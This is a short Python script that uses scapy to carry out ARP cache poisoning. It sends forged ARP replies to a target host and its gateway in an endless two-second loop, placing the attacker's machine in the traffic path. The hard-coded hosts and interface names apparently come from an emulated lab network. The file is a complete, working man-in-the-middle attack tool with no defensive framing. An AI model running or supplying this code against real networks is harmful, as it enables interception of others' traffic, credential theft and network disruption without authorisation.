from scapy.all import ARP, Ether, sendp, srp
import time


def get_mac(ip):
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip), timeout=2, verbose=0)
    return ans[0][1].hwsrc


def poison(gateway_ip, target_ip, iface):
    gateway_mac = get_mac(gateway_ip)
    target_mac = get_mac(target_ip)

    pkt_to_target = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)
    pkt_to_gateway = ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip)

    print(f"Poisoning {target_ip} and {gateway_ip}...")
    while True:
        sendp(Ether(dst=target_mac) / pkt_to_target, iface=iface, verbose=0)
        sendp(Ether(dst=gateway_mac) / pkt_to_gateway, iface=iface, verbose=0)
        time.sleep(2)


if __name__ == "__main__":
    gateway_ip = "10.1.0.1"  # r1
    target_ip = "10.1.0.3"  # ws3
    iface = "ws2-eth0"

    poison(gateway_ip, target_ip, iface)
